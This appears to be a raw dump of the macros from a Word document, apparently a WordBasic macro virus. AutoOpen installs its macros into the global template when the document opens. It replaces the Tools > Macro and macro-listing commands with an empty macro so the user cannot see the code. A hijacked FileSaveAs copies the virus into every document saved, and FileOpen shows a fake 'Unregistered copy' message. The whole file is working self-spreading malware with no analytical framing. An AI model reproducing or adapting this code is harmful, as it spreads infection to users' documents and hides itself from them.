   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   'On Error Goto Abort
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If (dlg.Format = 0) Or (dlg.Format = 1) Then
       WordBasic.MacroCopy "FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs"
       WordBasic.MacroCopy "FileOpen", WordBasic.[WindowName$]() + ":FileOpen"
       WordBasic.MacroCopy "CoolOp", WordBasic.[WindowName$]() + ":CoolOp"
       WordBasic.MacroCopy "AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen"
       dlg.Format = 1
   End If
   WordBasic.FileSaveAs dlg
   Abort:
   End Sub

   Attribute VB_Name = "FileOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "????????? ???????????? ???????? ??? ??????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
     Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
      WordBasic.CurValues.FileOpen dlg
      WordBasic.Dialog.FileOpen dlg
     WordBasic.FileOpen dlg
    WordBasic.PrintStatusBar "Unregistered copy of MS Word !"
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim iMacroCount
   Dim i
   Dim bInstalled
   Dim sMe$
   Dim Macro$
       On Error GoTo -1: On Error GoTo Abort
       iMacroCount = WordBasic.CountMacros(0, 0)
       For i = 1 To iMacroCount
           If WordBasic.[MacroName$](i, 0, 0) = "CoolOp" Then
               bInstalled = -1
           End If
       Next i
       If Not bInstalled Then
           sMe$ = WordBasic.[FileName$]()
           Macro$ = sMe$ + ":CoolOp"
           WordBasic.MacroCopy Macro$, "CoolOp", 0
           Macro$ = sMe$ + ":FileOpen"
           WordBasic.MacroCopy Macro$, "FileOpen", 0
           Macro$ = sMe$ + ":FileSaveAs"
           WordBasic.MacroCopy Macro$, "FileSaveAs", 0
           Macro$ = sMe$ + ":AutoOpen"
           WordBasic.MacroCopy Macro$, "AutoOpen", 0
           Macro$ = sMe$ + ":CoolOp"
           WordBasic.MacroCopy Macro$, "ToolsMacro", 0
           Macro$ = sMe$ + ":CoolOp"
           WordBasic.MacroCopy Macro$, "ListMacros", 0
       End If
   Abort:

   End Sub

   Attribute VB_Name = "CoolOp"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Format text using extra-manipulation."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.CoolOp.MAIN"

   End Sub
